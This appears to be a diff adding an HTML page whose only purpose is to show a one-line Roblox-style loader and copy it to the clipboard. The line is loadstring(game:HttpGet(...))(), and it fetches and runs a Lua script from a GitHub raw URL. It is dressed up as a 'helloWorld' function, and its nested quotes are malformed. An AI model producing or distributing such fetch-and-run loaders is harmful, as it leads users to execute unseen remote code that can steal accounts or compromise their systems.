@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code Box with Copy to Clipboard</title>
+    <style>
+        #codeBox {
+            border: 1px solid #ccc;
+            padding: 10px;
+            margin-bottom: 20px;
+            font-family: 'Courier New', monospace;
+        }
+
+        #copyButton {
+            cursor: pointer;
+            padding: 5px 10px;
+            background-color: #4CAF50;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div id="codeBox">
+        <p>function helloWorld() {</p>
+        <p>    console.log("loadstring(game:HttpGet("https://raw.githubusercontent.com/kernelcore32/MC6/main/main.lua"))()");</p>
+        <p>}</p>
+    </div>
+
+    <button id="copyButton" onclick="copyToClipboard()">Copy to Clipboard</button>
+
+    <script>
+        function copyToClipboard() {
+            var codeBox = document.getElementById("codeBox");
+            var textArea = document.createElement("textarea");
+            textArea.value = codeBox.innerText;
+            document.body.appendChild(textArea);
+
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+
+            alert("Loadstring has been copied to clipboard!");
+        }
+    </script>
+</body>
+</html>
